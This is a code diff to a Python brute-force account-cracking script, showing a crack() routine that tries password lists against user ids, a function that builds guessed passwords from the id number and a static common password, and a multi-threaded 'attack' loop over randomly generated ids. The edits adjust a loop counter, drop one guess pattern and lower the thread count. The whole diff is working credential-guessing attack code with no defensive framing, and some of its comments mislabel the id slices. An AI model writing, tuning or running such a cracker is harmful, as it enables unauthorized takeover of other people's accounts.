@@ -221,7 +221,7 @@ def crack(uid, password_list, total_count):
             else:
                 #print(f"\r\033[1;91m [ERROR] - Status code {respon.status_code}")
                 continue
-        loop += 1
+            loop += 1
     except requests.exceptions.Timeout:
         #print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
         return False
@@ -256,7 +256,6 @@ def get_password_patterns(uid):
         uid,         # Full number
         '57273200',  # Static common password
         uid[:7],     # First 6 digits
-        uid[4:],     # First 8 digits
     ]
 
 def random_number():
@@ -308,7 +307,7 @@ def random_number():
     # Start multi-threaded attack
     start_time = time.time()
     
-    with ThreadPoolExecutor(max_workers=80) as executor:
+    with ThreadPoolExecutor(max_workers=60) as executor:
         futures = []
         
         for random_id in idz:
